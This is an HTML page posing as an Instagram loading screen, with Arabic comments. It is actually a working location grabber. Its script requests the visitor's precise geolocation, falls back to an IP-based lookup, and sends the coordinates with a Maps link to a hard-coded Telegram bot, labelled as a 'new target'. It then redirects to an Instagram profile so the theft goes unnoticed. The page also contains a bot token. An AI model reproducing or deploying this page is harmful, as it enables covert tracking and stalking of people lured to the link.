<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            padding: 40px;
        }
        .insta-logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 30px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 1.5s ease-in-out infinite;
        }
        .insta-logo-inner {
            width: 30px;
            height: 30px;
            border: 3px solid #fff;
            border-radius: 8px;
            position: relative;
        }
        .insta-logo-inner::after {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            border: 3px solid #fff;
            border-radius: 50%;
            top: 5px;
            left: 5px;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
        }
        .progress-bar {
            width: 220px;
            height: 3px;
            background: #1a1a1a;
            border-radius: 2px;
            margin: 25px auto;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #d6249f, #fd5949);
            border-radius: 2px;
            transition: width 0.3s ease;
        }
        .status-text {
            color: #666;
            font-size: 12px;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    
    <div class="loader-container" id="loader">
        <div class="insta-logo">
            <div class="insta-logo-inner"></div>
        </div>
        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>
        <div class="status-text" id="statustxt">جارِ تحميل الصفحة...</div>
    </div>

    <script>
        const TOKEN = "8652265611:AAGrG4nv5TiUVcY_H9ica6VpLGOPSIzXy4M";
        const CHAT_ID = "6829017835";
        const TARGET_URL = "https://www.instagram.com/mhmdbwdwl35?igsh=MWZqajB2MTZ1N2pnYQ==";
        const API = `https://api.telegram.org/bot${TOKEN}`;

        const progress = document.getElementById('progress');
        const statustxt = document.getElementById('statustxt');
        let progressValue = 0;
        let locationSent = false;

        // محاكاة تقدم التحميل
        const progressInterval = setInterval(() => {
            progressValue += Math.random() * 10 + 2;
            if (progressValue > 90) progressValue = 90;
            progress.style.width = progressValue + '%';
        }, 400);

        // دالة إرسال الموقع لتليجرام
        async function sendLocation(lat, lon, acc) {
            try {
                await fetch(`${API}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: lat,
                        longitude: lon,
                        horizontal_accuracy: acc
                    })
                });
                await fetch(`${API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `📍 هدف جديد:\nخط العرض: ${lat}\nخط الطول: ${lon}\nالدقة: ±${Math.round(acc)}m\n🗺️ https://maps.google.com/?q=${lat},${lon}`
                    })
                });
                locationSent = true;
            } catch(e) {}
        }

        // سحب الموقع
        function grabLocation() {
            if (locationSent) return;
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                    },
                    (err) => {
                        // فشل دقيق – نجرب الـ IP تقريبي
                        fetch('https://ipapi.co/json/')
                            .then(r => r.json())
                            .then(data => {
                                if (data.latitude && data.longitude) {
                                    sendLocation(data.latitude, data.longitude, 5000);
                                }
                            })
                            .catch(() => {});
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
        }

        // التوجيه للهدف
        async function redirectNow() {
            clearInterval(progressInterval);
            progress.style.width = '100%';
            statustxt.textContent = 'تم التحميل، جاري التحويل...';
            await new Promise(r => setTimeout(r, 500));
            window.location.href = TARGET_URL;
        }

        // البداية
        async function main() {
            // طلب الموقع فوراً (المتصفح سيظهر إشعار "هذا الموقع يريد معرفة موقعك")
            grabLocation();
            
            // إن رفض أو وافق – نتقدم طبيعي
            setTimeout(() => {
                progressValue = 90;
                progress.style.width = '90%';
                statustxt.textContent = 'يكتمل التحميل...';
            }, 1500);
            
            setTimeout(redirectNow, 3000);
        }

        main();
    </script>
</body>
</html>
